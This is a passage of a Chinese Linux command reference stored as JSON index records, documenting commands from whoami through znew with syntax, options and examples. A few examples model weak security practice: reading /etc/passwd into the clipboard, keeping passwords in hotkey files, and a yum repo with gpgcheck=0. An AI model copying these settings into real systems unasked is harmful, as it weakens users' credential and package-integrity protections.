命令"],"tags":["Linux","Linux Command","Linux 命令","who"]},{"title":"【Linux 命令】whoami","url":"/linux-command/whoami/","content":"\n打印当前有效的用户ID对应的名称\n\n## 概要\n\n```shell\nwhoami [OPTION]...\n```\n\n## 主要用途\n\n- 打印当前有效的用户ID对应的名称。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n[root@localhost ~]# whoami\nroot\n```\n\n### 注意\n\n1. 该命令等价于 `id -un`。\n2. 注意区分 `whoami` 和 `logname` 这两个命令；比如我们以用户 `root` 打开的终端，然后切换到了用户 `user2`。此时， `whoami`返回的是当前用户 `user2`, `logname` 返回的是 `root`，大家可以自行实践验证一下。\n3. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 whoami`，`info coreutils 'whoami invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","whoami"]},{"title":"【Linux 命令】write","url":"/linux-command/write/","content":"\n向指定登录用户终端上发送信息\n\n## 补充说明\n\n**write命令** 用于向指定登录用户终端上发送信息。通过write命令可传递信息给另一位登入系统的用户，当输入完毕后，键入EOF表示信息结束，write命令就会将信息传给对方。如果接收信息的用户不只登入本地主机一次，你可以指定接收信息的终端机编号。\n\n###  语法\n\n```shell\nwrite(参数)\n```\n\n###  参数\n\n```shell\n用户：指定要接受信息的登录用户；\n登陆终端：指定接收信息的用户的登录终端。\n```\n\n###  实例\n\n传信息给Rollaend，此时Rollaend只有一个连线 : \n\n```shell\nwrite Rollaend\n```\n\n接下来就是将信息打上去，结束请Ctrl+C：\n\n传信息给Rollaend、Rollaend的连线有pts/2、pts/3：\n\n```shell\nwrite Rollaend pts/2\n```\n\n接下来就是将信息打上去，结束请Ctrl+C：\n\n若对方设定`mesg n`，则此时信息将无法传给对方。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","write"]},{"title":"【Linux 命令】xargs","url":"/linux-command/xargs/","content":"\n给其他命令传递参数的一个过滤器\n\n## 补充说明\n\n**xargs 命令** 是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。它擅长将标准输入数据转换成命令行参数，xargs 能够处理管道或者 stdin 并将其转换成特定命令的命令参数。xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。xargs 的默认命令是 echo，空格是默认定界符。这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。xargs 是构建单行命令的重要组件之一。\n\n### xargs 命令用法\n\nxargs 用作替换工具，读取输入数据重新格式化后输出。\n\n定义一个测试文件，内有多行文本数据：\n\n```shell\ncat test.txt\n\na b c d e f g\nh i j k l m n\no p q\nr s t\nu v w x y z\n```\n\n多行输入单行输出：\n\n```shell\ncat test.txt | xargs\n\na b c d e f g h i j k l m n o p q r s t u v w x y z\n```\n\n#### 使用 -n 进行多行输出\n**-n 选项** 多行输出：\n\n```shell\ncat test.txt | xargs -n3\n\na b c\nd e f\ng h i\nj k l\nm n o\np q r\ns t u\nv w x\ny z\n```\n\n#### 使用 -d 分割输入\n**-d 选项** 可以自定义一个定界符：\n\n```shell\necho \"nameXnameXnameXname\" | xargs -dX\n\nname name name name\n```\n\n结合 **-n 选项** 使用：\n\n```shell\necho \"nameXnameXnameXname\" | xargs -dX -n2\n\nname name\nname name\n```\n\n#### 读取 stdin\n**读取 stdin，将格式化后的参数传递给命令**\n\n假设一个命令为 sk.sh 和一个保存参数的文件 arg.txt：\n\n```shell\n#!/bin/bash\n#sk.sh 命令内容，打印出所有参数。\n\necho $*\n```\n\narg.txt 文件内容：\n\n```shell\ncat arg.txt\n\naaa\nbbb\nccc\n```\n\n#### 结合 -I 选项\nxargs 的一个 **选项 -I** ，使用 -I 指定一个替换字符串{}，这个字符串在 xargs 扩展时会被替换掉，当 -I 与 xargs 结合使用，每一个参数命令都会被执行一次：\n\n```shell\ncat arg.txt | xargs -I {} ./sk.sh -p {} -l\n\n-p aaa -l\n-p bbb -l\n-p ccc -l\n```\n\n复制所有图片文件到 /data/images 目录下：\n\n```shell\nls *.jpg | xargs -n1 -I cp {} /data/images\n```\n\n#### 结合 find 命令使用\n**xargs 结合 find 使用**\n\n用 rm 删除太多的文件时候，可能得到一个错误信息：`/bin/rm Argument list too long`. 用 `xargs` 去避免这个问题：\n\n```shell\nfind . -type f -name \"*.log\" -print0 | xargs -0 rm -f\n```\n\nxargs -0 将 `\\0` 作为定界符。\n\n统计一个源代码目录中所有 php 文件的行数：\n\n```shell\nfind . -type f -name \"*.php\" -print0 | xargs -0 wc -l\n```\n\n查找所有的 jpg 文件，并且压缩它们：\n\n```shell\nfind . -type f -name \"*.jpg\" -print | xargs tar -czvf images.tar.gz\n```\n\n#### 打印出执行的命令\n结合 `-t` 选项可以打印出 `xargs` 执行的命令\n\n    ls | xargs -t -I{} echo {}\n\n会输出当前目录下的文件列表和执行的 echo 命令\n\n#### 使用 -p 选项确认执行的命令\n`-p` 选项会在执行每一个命令时弹出确认，当你需要非常准确的确认每一次操作时可以使用 `-p` 参数，比如，查找当前目录下 `.log` 文件，每一次删除都需要确认：\n\n    find . -maxdepth 1 -name \"*.log\" | xargs -p -I{} rm {}\n\n#### 执行多个命令\n使用 `-I` 选项可以让 `xargs` 执行多个命令\n\n    cat foo.txt\n    one\n    two\n    three\n\n    cat foo.txt | xargs -I % sh -c 'echo %; mkdir %'\n    one\n    two\n    three\n\n    ls\n    one two three\n\n\n#### 其他应用\n**xargs 其他应用**\n\n假如你有一个文件包含了很多你希望下载的 URL，你能够使用 xargs 下载所有链接：\n\n```shell\ncat url-list.txt | xargs wget -c\n```\n\n### 子 Shell（Subshells）\n\n运行一个 shell 脚本时会启动另一个命令解释器.，就好像你的命令是在命令行提示下被解释的一样，类似于批处理文件里的一系列命令。每个 shell 脚本有效地运行在父 shell(parent shell) 的一个子进程里。这个父 shell 是指在一个控制终端或在一个 xterm 窗口中给你命令指示符的进程。\n\n```shell\ncmd1 | ( cmd2; cmd3; cmd4 ) | cmd5\n```\n\n如果 cmd2 是 cd /，那么就会改变子 Shell 的工作目录，这种改变只是局限于子 shell 内部，cmd5 则完全不知道工作目录发生的变化。子 shell 是嵌在圆括号 () 内部的命令序列，子 Shell 内部定义的变量为局部变量。\n\n子 shell 可用于为一组命令设定临时的环境变量：\n\n```shell\nCOMMAND1\nCOMMAND2\nCOMMAND3\n(\n  IFS=:\n  PATH=/bin\n  unset TERMINFO\n  set -C\n  shift 5\n  COMMAND4\n  COMMAND5\n  exit 3 # 只是从子 shell 退出。\n)\n# 父 shell 不受影响，变量值没有更改。\nCOMMAND6\nCOMMAND7\n```\n\n## reference\n\n- <https://shapeshed.com/unix-xargs/>\n\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xargs"]},{"title":"【Linux 命令】xauth","url":"/linux-command/xauth/","content":"\n显示和编辑被用于连接X服务器的认证信息\n\n## 补充说明\n\n**xauth命令** 用于显示和编辑被用于连接X服务器的认证信息。\n\n###  语法\n\n```shell\nxauth(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：不使用默认的认证文件，而使用指定的认证文件；\n-q：安静模式，不打印未请求的状态信息；\n-v：详细模式，打印指定的各种操作信息；\n-i：忽略认证文件锁定；\n-b：执行任何操作，终端认证文件锁定。\n```\n\n###  参数\n\n*   add：添加认证条目到认证文件中；\n*   extract：将指定的设备内容加入到指定的密码文件中；\n*   info：显示授权文件相关信息；\n*   exit：退出交互模式；\n*   list：列出给定的显示设备的内容；\n*   merge：合并多个授权文件内容；\n*   extract：将指定设备内容写入指定的授权文件；\n*   nextrct：将指定设备内容写入指定的授权文件；\n*   nmerge：合并多个授权文件内容；\n*   remove：删除指定显示设备的授权条目；\n*   source：从指定文件读取包含xauth的内容指令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xauth"]},{"title":"【Linux 命令】xclip","url":"/linux-command/xclip/","content":"\n管理 X 粘贴板\n\n## 补充说明\n\n在 X 系统里面，从一个窗口复制一段文字到另一个窗口，有两套机制，分别是 Selections 和 cut buffers。\n\n常用的 copy & paste 是利用的 cut buffers 机制;另外用鼠标选中一段文字，然后在另一个窗口按鼠标中键实现复制，利用的是 selections 机制。selection 又可以分为 master 和 slave selection。\n\n当用鼠标选中一段文件，这段文字就自动被复制到 master selection。然后在另一个地方按鼠标中键，就自动把 master selection 的内容粘贴出来。\n\n当你想复制少量文字的时候，两种方法都是很方便的。但是当复制大段文字的时候就挺麻烦。另外就是你可能会频繁的执行一些复制粘贴工作，不停的用鼠标选中文字，然后再粘贴。这是对手指的折磨。\n\n我忍受不了这种折磨，所以发现了 xclip， 方便的管理 X selections 里面内容的工具。\n\n比如如下命令就把文件 /etc/passwd 的内容复制到 X master selections 里面了。\n\n```shell\nxclip -i /etc/passwd\n```\n\n然后到别的地方就能复制出来，利用鼠标中键。或者是更舒服的 shift+insert。 我现在最常用的方法是通过键盘绑定来管理 X master selections 的内容。比如 alt+F1 就能把我的 ~/f1 的内容复制到 X master selections，alt+F2 复制 ~/f2 的内容。这样就能把你需要经常用到的内容方便的进行复制粘贴。比如常用的密码啥的。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xclip"]},{"title":"【Linux 命令】xhost","url":"/linux-command/xhost/","content":"\n制哪些X客户端能够在X服务器上显示\n\n## 补充说明\n\n**xhost命令** 是X服务器的访问控制工具，用来控制哪些X客户端能够在X服务器上显示。该命令必须从有显示连接的机器上运行。可以通过使用`-host`参数，从访问列表中除去一个名称。不要从访问列表中除去当前的名称。如果已经这样做了，请在作出任何更改之前注销系统。\n\n###  语法\n\n```shell\nxhost(参数)\n```\n\n###  参数\n\n* +：关闭访问控制，允许任何主机访问本地的X服务器；\n* -：打开访问控制，仅允许授权清单中的主机访问本地的X服务器。\n\n输入无变量的xhost命令将显示访问X服务器的当前主机名，并显示一条消息表明访问是否已启用。\n\n为了安全起见，只能从控制主机运行影响访问控制的选项。对于工作站来说，这台机器也就是服务器。对于X终端来说，这台机器是登录主机。\n\n要在缺省情况下启用远程名称，可以在`/etc/X?.hosts`文件中定义名称，其中`?`为启用访问的显示器号。\n\n例如，显示器`jeanne:0`可以由使用jeanne的缺省主机名的系统上的`/etc/X0.hosts`文件中定义的系统访问。在显示名称和文件名中，0表明已定义的远程系统允许通过增强X-Windows访问的显示器号。\n\n注意：`-name`参数，定义要从X服务器访问列表中除去的主机名。已有的连接没有被中断，但将拒绝新的连接请求。注意：可以除去当前的机器；然而，不允许进行进一步的连接（包括试图将其添加回来）。再一次启用本地连接的唯一方法就是将服务器复位（因此也会中断所有连接）。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xhost"]},{"title":"【Linux 命令】xinit","url":"/linux-command/xinit/","content":"\n是Linux下X-Window系统的初始化程序\n\n## 补充说明\n\n**xinit命令** 是Linux下X-Window系统的初始化程序，主要完成X服务器的初始化设置。\n\n###  语法\n\n```shell\nxinit(参数)\n```\n\n###  参数\n\n* 客户端选项：客户端指令及选项；\n* --：用于区分客户端选项和服务器端选项；\n* 服务器端选项：服务器端选项指令及选项。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xinit"]},{"title":"【Linux 命令】xlsatoms","url":"/linux-command/xlsatoms/","content":"\n列出X服务器内部所有定义的原子成分\n\n## 补充说明\n\n**xlsatoms命令** 用于列出X服务器内部所有定义的原子成分，每个原子成分都有自身的编号。可利用参数设置列表范围，或直接指定欲查询的成分名称。\n\n###  语法\n\n```shell\nxlsatoms(选项)\n```\n\n###  选项\n\n* -display<显示器编号>：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；\n* -format<输出格式>：设置成分清单的列表格式，您可使用控制字符改变显示样式；\n* -name<成分名称>：列出指定的成分；\n* -range<列表范围>：设置成分清单的列表范围。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xlsatoms"]},{"title":"【Linux 命令】xlsclients","url":"/linux-command/xlsclients/","content":"\n列出显示器中的客户端应用程序\n\n## 补充说明\n\n**xlsclients命令** 用来列出显示器中的客户端应用程序。\n\n###  语法\n\n```shell\nxlsclients(选项)\n```\n\n###  选项\n\n```shell\n-a：列出所有显示器的客户端应用程序信息；\n-display<显示器编号>：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；\n-l：使用详细格式列表；\n-m<最大指令长度>：设置显示指令信息的最大长度，单位以字符计算。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xlsclients"]},{"title":"【Linux 命令】xlsfonts","url":"/linux-command/xlsfonts/","content":"\n列出X Server使用的字体\n\n## 补充说明\n\n**xlsfonts命令** 列出X Server使用的字体，也能使用范本样式仅列出的符合条件的字体。\n\n###  语法\n\n```shell\nxlsfonts(选项)\n```\n\n###  选项\n\n```shell\n-l：除字体名称外，同时列出字体的属性；\n-ll：此参数的效果和指定\"l\"参数类似，但显示更详细的信息；\n-lll：此参数的效果和指定\"ll\"参数类似，但显示更详细的信息；\n-m：配合参数\"-l\"使用时，一并列出字体大小的上下限；\n-n<显示栏位数>：设置每列显示的栏位数；\n-o：以OpenFont的形式列出字体清单；\n-u：列出字体清单时不依照其名称排序；\n-w<每列字符数>：设置每列的最大字符数。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xlsfonts"]},{"title":"【Linux 命令】xset","url":"/linux-command/xset/","content":"\n设置X-Window系统中的用户爱好的实用工具\n\n## 补充说明\n\n**xset命令** 是设置X-Window系统中的用户爱好的实用工具。\n\n###  语法\n\n```shell\nxset(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：蜂鸣器开关设置；\n-c：键盘按键声响设置。\n```\n\n###  参数\n\n* c：键盘按键声响设置；\n* s：屏幕保护程序设置。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xset"]},{"title":"【Linux 命令】xz","url":"/linux-command/xz/","content":"\nPOSIX 平台开发具有高压缩率的工具\n\n## 补充说明\n\n**xz命令** XZ Utils 是为 POSIX 平台开发具有高压缩率的工具。它使用 LZMA2 压缩算法，生成的压缩文件比 POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小，而且解压缩速度也很快。最初 XZ Utils 的是基于 LZMA-SDK 开发，但是 LZMA-SDK 包含了一些 WINDOWS 平台的特性，所以 XZ Utils 为以适应 POSIX 平台作了大幅的修改。XZ Utils 的出现也是为了取代 POSIX 系统中旧的 LZMA Utils。\n\n### 语法\n\n```shell\nxz(选项)(参数)\nxz [OPTION]... [FILE]...\n```\n\n### 选项\n\n```shell\n-z, --compress    # 强制压缩\n-d, --decompress, --uncompress\n                  # force decompression\n-t, --test        # 测试压缩文件的完整性\n-l, --list        # 列出有关.xz文件的信息\n-k, --keep        # 保留（不要删除）输入文件\n-f, --force       # 强制覆盖输出文件和（解）压缩链接\n-c, --stdout, --to-stdout\n                  # 写入标准输出，不要删除输入文件\n-0 ... -9         # 压缩预设; 默认为6; 取压缩机*和*\n                  # 使用7-9之前解压缩内存使用量考虑在内！\n-e, --extreme     # 尝试通过使用更多的CPU时间来提高压缩比;\n                  # 要求不影响解压缩存储器\n-T, --threads=NUM # 最多使用NUM个线程; 默认值为1;  set to 0\n                  # 设置为0，使用与处理器内核一样多的线程\n-q, --quiet       # 抑制警告; 指定两次以抑制错误\n-v, --verbose     # 冗长; 指定两次更详细\n-h, --help        # 显示这个简洁的帮助并退出\n-H, --long-help   # 显示更多帮助（还列出了高级选项）\n-V, --version     # 显示版本号并退出\n```\n\n### 参数\n\n* 源文件：指定连接的源文件。\n* 目标文件：指定源文件的目标连接文件。\n\n### 实例\n\n压缩一个文件 test.txt，压缩成功后生成 test.txt.xz, 原文件会被删除。\n\n```shell\n$ xz test.txt\n$ ls test.txt*\n\ntest.txt.xz\n```\n\n解压 test.txt.xz 文件，并使用参数 -k 保持原文件不被删除\n\n```shell\n$ xz -d -k test.txt.xz\n$ ls test.txt*\n\ntest.txt.xz test.txt\n```\n\n使用参数 -l 显示 .xz 文件的基本信息。基本信息包括压缩率、数据完整性验证方式等。也可以和参数 -v 或 -vv 配合显示更详尽的信息。\n\n```shell\nxz -l index.txt.xz\n# Strms  Blocks   Compressed Uncompressed  Ratio  Check   Filename\n#    1       1        768 B      1,240 B  0.619  CRC64   index.txt.\n```\n\n使用参数 -0, -1, -2, … -6, … -9 或参数 --fast, --best 设定压缩率。xz 命令的默认为 -6 ，对于大多数系统来说，甚至是一些较旧的系统，-4 … -6 压缩率预设值都不错的表现。\n\n```shell\n$ xz -k7 xz_pipe_decomp_mini.c\n$ xz -k --fast xz_pipe_decomp_mini.c\n```\n\n使用参数 -H 显示 xz 命令所有 options. 参数 -H 比使用参数 --help 显示的内容更详细。\n\n```shell\n$ xz -H  | more\n```\n\n借助 xargs 命令并行压缩多文件。下面的命令行可以将 /var/log 目录下所有的扩展名为 .log 的文件压缩。通过 xargs 命令同时运行多个 xz 进行压缩。\n\n```shell\n# 运行此命令须有 root 权限。\nfind /var/log -type f -iname \"*.log\" -print0 | xargs -P4 -n16 xz -T1\n```\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","xz"]},{"title":"【Linux 命令】yes","url":"/linux-command/yes/","content":"\n重复打印指定字符串\n\n## 补充说明\n\n**yes命令** 在命令行中输出指定的字符串，直到yes进程被杀死。不带任何参数输入yes命令默认的字符串就是y。\n\n###  语法\n\n```shell\nyes(参数)\n```\n\n###  参数\n\n字符串：指定要重复打印的字符串。\n\n###  实例\n\n```shell\n[root@localhost ~]# yes testline\n\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\n...一直重复打印 testline，按Ctrl+C结束。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","yes"]},{"title":"【Linux 命令】ypdomainname","url":"/linux-command/ypdomainname/","content":"\n显示主机的NIS的域名\n\n## 补充说明\n\n**ypdomainname命令** 显示主机的NIS的域名。\n\n###  语法\n\n```shell\nypdomainname(选项)\n```\n\n###  选项\n\n```shell\n-v：详细信息模式。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ypdomainname"]},{"title":"【Linux 命令】yum","url":"/linux-command/yum/","content":"\n基于RPM的软件包管理器\n\n## 补充说明\n\n**yum命令** 是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更新与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。\n\nyum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。\n\n### 语法\n\n```shell\nyum(选项)(参数)\n```\n\n### 选项\n\n```shell\n-h：显示帮助信息；\n-y：对所有的提问都回答“yes”；\n-c：指定配置文件；\n-q：安静模式；\n-v：详细模式；\n-d：设置调试等级（0-10）；\n-e：设置错误等级（0-10）；\n-R：设置yum处理一个命令的最大等待时间；\n-C：完全从缓存中运行，而不去下载或者更新任何头文件。\n```\n\n### 参数\n\n```shell\ninstall：安装rpm软件包；\nupdate：更新rpm软件包；\ncheck-update：检查是否有可用的更新rpm软件包；\nremove：删除指定的rpm软件包；\nlist：显示软件包的信息；\nsearch：检查软件包的信息；\ninfo：显示指定的rpm软件包的描述信息和概要信息；\nclean：清理yum过期的缓存；\nshell：进入yum的shell提示符；\nresolvedep：显示rpm软件包的依赖关系；\nlocalinstall：安装本地的rpm软件包；\nlocalupdate：显示本地rpm软件包进行更新；\ndeplist：显示rpm软件包的所有依赖关系。\n```\n\n### 实例\n\n部分常用的命令包括：\n\n*   自动搜索最快镜像插件：`yum install yum-fastestmirror`\n*   安装yum图形窗口插件：`yum install yumex`\n*   查看可能批量安装的列表：`yum grouplist`\n\n**安装**\n\n```shell\nyum install              #全部安装\nyum install package1     #安装指定的安装包package1\nyum groupinsall group1   #安装程序组group1\n```\n\n**更新和升级**\n\n```shell\nyum update               #全部更新\nyum update package1      #更新指定程序包package1\nyum check-update         #检查可更新的程序\nyum upgrade package1     #升级指定程序包package1\nyum groupupdate group1   #升级程序组group1\n```\n\n**查找和显示**\n\n```shell\n# 检查 MySQL 是否已安装\nyum list installed | grep mysql\nyum list installed mysql*\n\nyum info package1      #显示安装包信息package1\nyum list               #显示所有已经安装和可以安装的程序包\nyum list package1      #显示指定程序包安装情况package1\nyum groupinfo group1   #显示程序组group1信息yum search string 根据关键字string查找安装包\n```\n\n**删除程序**\n\n```shell\nyum remove &#124; erase package1   #删除程序包package1\nyum groupremove group1             #删除程序组group1\nyum deplist package1               #查看程序package1依赖情况\n```\n\n**清除缓存**\n\n```shell\nyum clean packages       # 清除缓存目录下的软件包\nyum clean headers        # 清除缓存目录下的 headers\nyum clean oldheaders     # 清除缓存目录下旧的 headers\n```\n\n**更多实例**\n\n```shell\n# yum\n/etc/yum.repos.d/       # yum 源配置文件\nvi /etc/yum.repos.d/nginx.repo # 举个栗子: nginx yum源\n[nginx]\nname=nginx repo\nbaseurl=http://nginx.org/packages/centos/6/$basearch/\ngpgcheck=0\nenabled=1\n\n# yum mirror\nmv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak\nwget https://mirror.tuna.tsinghua.edu.cn/help/centos/\nyum makecache\n\n# 添加中文语言支持\nLANG=C # 原始语言\nLANG=zh_CN.utf8 # 切换到中文\nyum groupinstall \"Chinese Support\" # 添加中文语言支持\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","yum"]},{"title":"【Linux 命令】zcat","url":"/linux-command/zcat/","content":"\n显示压缩包中文件的内容\n\n## 补充说明\n\n**zcat命令** 用于不真正解压缩文件，就能显示压缩包中文件的内容的场合。\n\n###  语法\n\n```shell\nzcat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-S：指定gzip格式的压缩包的后缀。当后缀不是标准压缩包后缀时使用此选项；\n-c：将文件内容写到标注输出；\n-d：执行解压缩操作；\n-l：显示压缩包中文件的列表；\n-L：显示软件许可信息；\n-q：禁用警告信息；\n-r：在目录上执行递归操作；\n-t：测试压缩文件的完整性；\n-V：显示指令的版本信息；\n-l：更快的压缩速度；\n-9：更高的压缩比。\n```\n\n###  参数\n\n文件：指定要显示其中文件内容的压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","zcat"]},{"title":"【Linux 命令】zfore","url":"/linux-command/zfore/","content":"\n强制为gzip格式的压缩文件添加.gz后缀\n\n## 补充说明\n\n**zfore命令** 强制为gzip格式的压缩文件添加“.gz”后缀。\n\n###  语法\n\n```shell\nzfore(参数)\n```\n\n###  参数\n\n文件列表：指定要添加“.gz”后缀的gzip压缩文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","zfore"]},{"title":"【Linux 命令】zip","url":"/linux-command/zip/","content":"\n可以用来解压缩文件\n\n## 补充说明\n\n**zip命令** 可以用来解压缩文件，或者对文件进行打包操作。zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有“.zip”扩展名的压缩文件。\n\n### 语法\n\n```shell\nzip(选项)(参数)\n```\n\n### 选项\n\n```shell\n-A：调整可执行的自动解压缩文件；\n-b<工作目录>：指定暂时存放文件的目录；\n-c：替每个被压缩的文件加上注释；\n-d：从压缩文件内删除指定的文件；\n-D：压缩文件内不建立目录名称；\n-f：此参数的效果和指定“-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中；\n-F：尝试修复已损坏的压缩文件；\n-g：将文件压缩后附加在已有的压缩文件之后，而非另行建立新的压缩文件；\n-h：在线帮助；\n-i<范本样式>：只压缩符合条件的文件；\n-j：只保存文件名称及其内容，而不存放任何目录名称；\n-J：删除压缩文件前面不必要的数据；\n-k：使用MS-DOS兼容格式的文件名称；\n-l：压缩文件时，把LF字符置换成LF+CR字符；\n-ll：压缩文件时，把LF+cp字符置换成LF字符；\n-L：显示版权信息；\n-m：将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中；\n-n<字尾字符串>：不压缩具有特定字尾字符串的文件；\n-o：以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同；\n-q：不显示指令执行过程；\n-r：递归处理，将指定目录下的所有文件和子目录一并处理；\n-S：包含系统和隐藏文件；\n-t<日期时间>：把压缩文件的日期设成指定的日期；\n-T：检查备份文件内的每个文件是否正确无误；\n-u：更换较新的文件到压缩文件内；\n-v：显示指令执行过程或显示版本信息；\n-V：保存VMS操作系统的文件属性；\n-w：在文件名称里假如版本编号，本参数仅在VMS操作系统下有效；\n-x<范本样式>：压缩时排除符合条件的文件；\n-X：不保存额外的文件属性；\n-y：直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；\n-z：替压缩文件加上注释；\n-$：保存第一个被压缩文件所在磁盘的卷册名称；\n-<压缩效率>：压缩效率是一个介于1~9的数值。\n```\n\n### 参数\n\n*   zip压缩包：指定要创建的zip压缩包；\n*   文件列表：指定要压缩的文件列表。\n\n### 实例\n\n将`/home/Blinux/html/`这个目录下所有文件和文件夹打包为当前目录下的html.zip：\n\n```shell\nzip -q -r html.zip /home/Blinux/html\n```\n\n上面的命令操作是将绝对地址的文件及文件夹进行压缩，以下给出压缩相对路径目录，比如目前在Bliux这个目录下，执行以下操作可以达到以上同样的效果：\n\n```shell\nzip -q -r html.zip html\n```\n\n比如现在我的html目录下，我操作的zip压缩命令是：\n\n```shell\nzip -q -r html.zip *\n```\n\n压缩 `example/basic/` 目录内容到 `basic.zip` 压缩包中 `-x` 指定排除目录，注意没有双引号将不起作用。\n\n```shell\nzip -r basic.zip example/basic/ -x \"example/basic/node_modules/*\" -x \"example/basic/build/*\" -x \"example/basic/coverage/*\"\n```\n\n上面压缩解压出来，内容存放在 `example/basic/`， 如果想存放到根目录，进入目录进行压缩，目前没有找到一个合适的参数来解决此问题。\n\n```\ncd example/basic/ && zip -r basic.zip . -x \"node_modules/*\" -x \"build/*\" -x \"coverage/*\"\n```\n\n压缩效率选择:\n\n```shell\nzip -9 # 1-9 faster->better\n```\n\n创建 `public_html` 目录下忽略所有文件和文件夹，排除包括文本 `backup` 的所有文件。\n\n```shell\n$ zip -r public_html.zip public_html -x *backup*\n```\n\n`httpdocs` 目录忽略 `.svn` 文件或 `git` 的文件和目录下创建所有文件的归档。\n\n```shell\n$ zip -r httpdocs.zip httpdocs --exclude *.svn* --exclude *.git*\n```\n\n`httpdocs` 目录忽略的所有文件，并与 `.log` 结尾的目录下创建所有文件的归档。\n\n```shell\n$ zip -r httpdocs.zip httpdocs --exclude \"*.log\"\n```\n\n### 问题解决\n\nCentOS7中命令找不到\n\n```shell\n-Bash: Unzip: Command Not Found\n```\n\n解决方法\n\n```shell\nyum install -y unzip zip\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","zip"]},{"title":"【Linux 命令】zipinfo","url":"/linux-command/zipinfo/","content":"\n用来列出压缩文件信息\n\n## 补充说明\n\n**zipinfo命令** 用来列出压缩文件信息。执行zipinfo指令可得知zip压缩文件的详细信息。\n\n###  语法\n\n```shell\nzipinfo(选项)(参数)\n```\n\n###  选项\n\n```shell\n-1：只列出文件名称；\n-2：此参数的效果和指定“-1”参数类似，但可搭配“-h”，“-t”和“-z”参数使用；\n-h：只列出压缩文件的文件名称；\n-l：此参数的效果和指定“-m”参数类似，但会列出原始文件的大小而非每个文件的压缩率；\n-m：此参数的效果和指定“-s”参数类似，但多会列出每个文件的压缩率；\n-M：若信息内容超过一个画面，则采用类似more指令的方式列出信息；\n-s：用类似执行“ls-l”指令的效果列出压缩文件内容；\n-t：只列出压缩文件内所包含的文件数目，压缩前后的文件大小及压缩率；\n-T：将压缩文件内每个文件的日期时间用年，月，日，时，分，秒的顺序列出；\n-v：详细显示压缩文件内每一个文件的信息；\n-x<范本样式>：不列出符合条件的文件的信息；\n-z：如果压缩文件内含有注释，就将注释显示出来。\n```\n\n###  参数\n\n文件：指定zip格式的压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","zipinfo"]},{"title":"【Linux 命令】zipsplit","url":"/linux-command/zipsplit/","content":"\n将较大的zip压缩包分割成各个较小的压缩包\n\n## 补充说明\n\n**zipsplit命令** 用于将较大的“zip”压缩包分割成各个较小的“zip”压缩包。\n\n###  语法\n\n```shell\nzipsplit(选项)(参数)\n```\n\n###  选项\n\n```shell\n-n：指定分割后每个zip文件的大小；\n-t：报告将要产生的较小的zip文件的大小；\n-b：指定分割后的zip文件的存放位置。\n```\n\n###  参数\n\n文件：指定要分割的zip压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","zipsplit"]},{"title":"【Linux 命令】znew","url":"/linux-command/znew/","content":"\n将.Z压缩包重新转化为gzip命令压缩的.gz压缩包\n\n## 补充说明\n\n**znew命令** 用于将使用compress命令压缩的“.Z”压缩包重新转化为使用gzip命令压缩的“.gz”压缩包。\n\n###  语法\n\n```shell\nznew(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：# 强制执行转换操作，即是目标“.gz”已经存在；\n-t：# 删除原文件前测试新文件；\n-v：# 显示文件名和每个文件的压缩比；\n-9：# 食用油花的压缩比，速度较慢；\n-P：# 使用管道完成转换操作，以降低磁盘空间使用；\n-K：# 